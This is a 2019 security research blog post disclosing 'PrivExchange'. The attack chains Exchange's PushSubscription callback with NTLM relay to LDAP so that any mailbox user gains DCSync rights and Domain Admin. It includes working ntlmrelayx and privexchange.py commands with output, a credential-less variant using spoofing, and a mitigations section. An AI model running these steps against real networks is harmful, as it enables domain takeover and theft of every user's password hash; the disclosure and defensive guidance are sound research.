---
layout: single
classes: wide
title:  "Abusing Exchange: One API call away from Domain Admin"
date:   2019-01-21 19:08:57 +0100
---
In most organisations using Active Directory and Exchange, Exchange servers have such high privileges that being an Administrator on an Exchange server is enough to escalate to Domain Admin. Recently I came across a blog from the ZDI, in which they detail a way to let Exchange authenticate to attackers using NTLM over HTTP. This can be combined with an NTLM relay attack to escalate from any user with a mailbox to Domain Admin in probably 90% of the organisations I've seen that use Exchange. This attack is possible by default and while no patches are available at the point of writing, there are mitigations that can be applied to prevent this privilege escalation. This blog details the attack, some of the more technical details and mitigations, as well as releasing a [proof-of-concept tool](https://github.com/dirkjanm/privexchange/) for this attack which I've dubbed "PrivExchange".

# Combining known vulnerabilities in a new way
This blog combines a few known vulnerabilities and known protocol weaknesses into a new attack. There are 3 components which are combined to escalate from any user with a mailbox to Domain Admin access:

- Exchange Servers have (too) high privileges by default
- NTLM authentication is vulnerable to relay attacks
- Exchange has a feature which makes it authenticate to an attacker with the computer account of the Exchange server

## Exchange and high privileges
The main vulnerability here is that Exchange has high privileges in the Active Directory domain. The `Exchange Windows Permissions` group has `WriteDacl` access on the Domain object in Active Directory, which enables any member of this group to modify the domain privileges, among which is the privilege to perform DCSync operations. Users or computers with this privilege can perform synchronization operations that are normally used by Domain Controllers to replicate, which allows attackers to synchronize all the hashed passwords of users in the Active Directory. This has been covered by several researchers (see the references section at the end of this post), and I've written about it with my Fox-IT colleague Rindert [last year](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/). With that post I also released an update to [ntlmrelayx](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py) that adds the possibility to perform these Access Control List (ACL) based attack while NTLM relaying.

## NTLM relaying machine accounts
NTLM relaying has been around for a while. Previously, the main focus of this was relaying NTLM authentication over SMB in order to get code execution on other hosts. While this unfortunately remains a possibility in many company networks that are not hardened against this by enabling SMB signing, other protocols are also vulnerable to relaying. The in my opinion most interesting protocol for this is LDAP, which can be used to read and modify objects in the (Active) directory. If you need a refresher about NTLM relaying, you can read about it in [a blog](https://www.fox-it.com/en/insights/blogs/blog/inside-windows-network/) I wrote about it a while ago. The short version is that unless mitigations are applied, it is possible to pass authentication that is performed (automatically) by Windows when it connects to the attacker's machine on to other machines in the network, as is displayed in the image below:

![NTLM relaying](/assets/img/privexchange/ntlm-auth.svg){: .align-center}

When authentication is relayed to LDAP, objects in the directory can be modified to grant an attacker privileges, including the privileges required for DCSync operations. Thus, if we can get an Exchange server to authenticate to us with NTLM authentication, we can perform the ACL attack. It should be noted that relaying to LDAP only works if the victim is authenticating to us over HTTP, not over SMB (see the section "The technical bits" for an explanation).

## Getting Exchange to authenticate
The only component that was missing until now was an easy way to get Exchange to authenticate to us. A ZDI researcher (who remains unnamed in their article) discovered that it is possible to get Exchange to authenticate to an arbitrary URL over HTTP via the Exchange `PushSubscription` feature. In their [blog post](https://www.thezdi.com/blog/2018/12/19/an-insincere-form-of-flattery-impersonating-users-on-microsoft-exchange) they used this vulnerability to relay the NTLM authentication back to Exchange (this is called a reflection attack) and impersonate other users. If we instead combine this with the high privileges Exchange has by default and perform a relay attack instead of a reflection attack, we can use these privileges to grant ourselves DCSync rights. The push notification service has an option to send a message every X minutes (where X can be specified by the attacker), even if no event happened. This is something that ensures Exchange will connect to us even if there is no activity in an inbox.

# Performing the privilege escalation attack
A schematic of the above attack is displayed below, showing the steps that are performed to escalate privileges:

![PrivExchange attack](/assets/img/privexchange/privexchange-drawing.svg){: .align-center}

We need two tools to perform the attack, `privexchange.py` and `ntlmrelayx`. You can get both on GitHub in the [PrivExchange](https://github.com/dirkjanm/privexchange/) and [impacket](https://github.com/SecureAuthCorp/impacket/) repositories.
Start ntlmrelayx in relay mode with LDAP on a Domain Controller as target, and supply a user under the attackers control to escalate privileges with (in this case the `ntu` user):
```
ntlmrelayx.py -t ldap://s2016dc.testsegment.local --escalate-user ntu
```
Now we run the `privexchange.py` script:
```
user@localhost:~/exchpoc$ python privexchange.py -ah dev.testsegment.local s2012exc.testsegment.local -u ntu -d testsegment.local
Password: 
INFO: Using attacker URL: http://dev.testsegment.local/privexchange/
INFO: Exchange returned HTTP status 200 - authentication was OK
ERROR: The user you authenticated with does not have a mailbox associated. Try a different user.
```
When this is run with a user which doesn't have a mailbox, we will get the above error.
Let's try it again with a user which does have a mailbox associated:
```
user@localhost:~/exchpoc$ python privexchange.py -ah dev.testsegment.local s2012exc.testsegment.local -u testuser -d testsegment.local 
Password: 
INFO: Using attacker URL: http://dev.testsegment.local/privexchange/
INFO: Exchange returned HTTP status 200 - authentication was OK
INFO: API call was successful
```
After a minute (which is the value supplied for the push notification) we see the connection coming in at ntlmrelayx, which gives our user DCSync privileges:

![ntlmrelayx performing privesc](/assets/img/privexchange/ntlmrelay-exchange.png)
We confirm the DCSync rights are in place with secretsdump:
![dumping hashes](/assets/img/privexchange/secretsdump-hashes.png)

With all the hashed password of all Active Directory users, the attacker can create golden tickets to impersonate any user, or use any users password hash to authenticate to any service accepting NTLM or Kerberos authentication in the domain.

# The technical bits - relaying to LDAP and signing
I mentioned previously that relaying from SMB to LDAP does not work, which is also why this attack can't be performed by using for example the [SpoolService RPC abuse](https://github.com/leechristensen/SpoolSample/) that was recently released (since this authenticates over SMB). Since questions about this keep coming up and there is a lot of confusion about this, let's look at why this is. If you aren't looking for a deep dive into NTLM authentication, feel free to skip this section :).

The difference between NTLM authentication in SMB and HTTP lies in the flags that are negotiated by default. The problematic part is the `NTLMSSP_NEGOTIATE_SIGN` flag (`0x00000010`), documented in [MS-NLMP section 2.2.2.5](https://msdn.microsoft.com/en-us/library/cc236650.aspx). NTLM authentication over HTTP does not set this flag by default, but if it is used over SMB this flag will be set by default:

![SMB with signing flag set](/assets/img/privexchange/smbtraffic.png)

When we relay this to LDAP the authentication will succeed, but LDAP will expect all the messages to be signed with a session key derived from the password (which we don't have in a relay attack). It will thus ignore any messages without signature, causing our attack to fail.
One may wonder if it is possible to modify these flags in transit, such that signing is not negotiated. This won't work on modern versions of Windows since they will include a MIC (Message Integrity Code) by default, which is a signature based on all 3 NTLM messages, so any modification in any of the messages will make it invalid.

![SMB with signing flag set](/assets/img/privexchange/ntlm-mic.png)

Can we remove the MIC? Well yes, we can, since it is not in a protected part of the NTLM message. There is however one last protection in NTLM authentication (NTLMv2 only) that prevents this: Deep within the NTLMv2 response, which is in itself signed with the victim's password, there is an `AV_PAIR` structure which is called `MsvAvFlags`. When this field has the value `0x0002`, it indicates that the client sent a MIC along with the type 3 message. 

![SMB with signing flag set](/assets/img/privexchange/micflag.png)

Modifying the NTLMv2 response will invalidate the authentication, so we can't remove this flags field. The flag field indicates a MIC was calculated and included, which will make the target server validate the MIC, which in turn validates that all 3 messages were not modified in transit, and thus we can't remove the signing flag.

This holds true for (I think) only the Microsoft implementation of NTLM. Custom appliances implementing NTLM most likely don't go down till the level of adding the MIC and `AV_PAIR` flags, making them vulnerable to flag modification and thus making SMB->LDAP relaying possible. An example of this is the [Java implementation](https://conference.hitb.org/hitbsecconf2018dxb/materials/D2T2%20-%20NTLM%20Relay%20Is%20Dead%20Long%20Live%20NTLM%20Relay%20-%20Jianing%20Wang%20and%20Junyu%20Zhou.pdf) of NTLM, which can be modified in transit to bypass security measures.

# Performing the attack without any credentials altogether
In the previous section we used compromised credentials to perform the first step of the attack. If an attacker is only in a position to perform a network attack, but doesn't have any credentials, it is still possible to trigger Exchange to authenticate. If we perform a SMB to HTTP (or HTTP to HTTP) relay attack (using LLMNR/NBNS/mitm6 spoofing) we can relay the authentication of a user in the same network segment to Exchange EWS and use their credentials to trigger the callback (thanks to [Mark](https://twitter.com/infosec_kb) for bringing this up!).
I've included a small modified `httpattack.py` which you can use with ntlmrelayx to perform the attack from a network perspective without any credentials (you just need to modify your attacker host since it is hardcoded in the file):

![Relaying NTLM authentication to EWS](/assets/img/privexchange/ews-relay.png)

# Mitigations
This attack depends on various components to work. In previous blogs I've already highlighted several defenses [against NTLM relaying](https://www.fox-it.com/en/insights/blogs/blog/inside-windows-network/) and against [relaying to LDAP specifically](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/).

The most important mitigations applicable to this attack are:
- Remove the unnecessary high privileges that Exchange has on the Domain object (see below for some links on this).
- Enable LDAP signing and [enable LDAP channel binding](https://support.microsoft.com/en-us/help/4034879/how-to-add-the-ldapenforcechannelbinding-registry-entry) to prevent relaying to LDAP and LDAPS respectively
- Block Exchange servers from making connections to workstations on arbitrary ports.
- Enable [Extended Protection for Authentication](https://msdn.microsoft.com/en-us/library/dd767318%28v=vs.90%29.aspx) on the Exchange endpoints in IIS (but not the Exchange Back End ones, this will break Exchange). This will verify the channel binding parameters in the NTLM authentication, which ties NTLM authentication to a TLS connection and prevent relaying to Exchange web services.
- Remove the registry key which makes relaying back to the Exchange server possible, as discussed in Microsofts [mitigation for CVE-2018-8518](https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2018-8581).
- Enforce SMB signing on Exchange servers (and preferable all other servers and workstations in the domain) to prevent cross-protocol relay attacks to SMB.

# The tools / affected versions
The proof-of concept tools can be found at <https://github.com/dirkjanm/PrivExchange>. They have been tested on the following Exchange/Windows versions:
- Exchange 2013 (CU21) on Server 2012R2, relayed to a Server 2016 DC (all fully patched)
- Exchange 2016 (CU11) on Server 2016, relayed to a Server 2019 DC (all fully patched)

Both the above Exchange servers were installed using Shared permission mode (which is the default), but according to [this writeup](https://github.com/gdedrouas/Exchange-AD-Privesc/blob/master/DomainObject/DomainObject.md) RBAC split permissions deployment is also vulnerable (I haven't personally tested this).

# Resources / References
The following blogs, whitepapers and research offer more information about these attacks:

## Mitigation resources
- <https://github.com/gdedrouas/Exchange-AD-Privesc/blob/master/DomainObject/Fix-DomainObjectDACL.ps1> (Removing dangerous Exchange permissions with PowerShell)
- <https://www.blackhat.com/docs/webcast/04262018-Webcast-Toxic-Waste-Removal-by-Andy-Robbins.pdf> (Identifying and removing dangerous Exchange permissions, by @\_wald0)
- [ACL privilege escalation research](https://www.blackhat.com/docs/us-17/wednesday/us-17-Robbins-An-ACE-Up-The-Sleeve-Designing-Active-Directory-DACL-Backdoors-wp.pdf) by @\_wald0 and @harmj0y

## NTLM relaying/signing discussions
- [Review of NTLM reflection attack over network](https://github.com/SecureAuthCorp/impacket/issues/451)
- [NTLM SMB->LDAP relaying](https://github.com/SecureAuthCorp/impacket/pull/500)
- [Playing with relayed credentials](https://www.secureauth.com/blog/playing-relayed-credentials) by @agsolino

## Other references
- <https://www.blackhat.com/docs/us-17/wednesday/us-17-Robbins-An-ACE-Up-The-Sleeve-Designing-Active-Directory-DACL-Backdoors-wp.pdf/>
- [MS-NLMP](https://msdn.microsoft.com/en-us/library/cc236621.aspx)
- [ZDI post on this issue which discusses this Exchange API](https://www.zerodayinitiative.com/blog/2018/12/19/an-insincere-form-of-flattery-impersonating-users-on-microsoft-exchange)
- [Remote NTLM Relaying through meterpreter](https://diablohorn.com/2018/08/25/remote-ntlm-relaying-through-meterpreter-on-windows-port-445/) which discusses how to relay through a pivot host remotely.
- [My HITB slided on ACL attacks](https://www.slideshare.net/DirkjanMollema/aclpwn-active-directory-acl-exploitation-with-bloodhound)
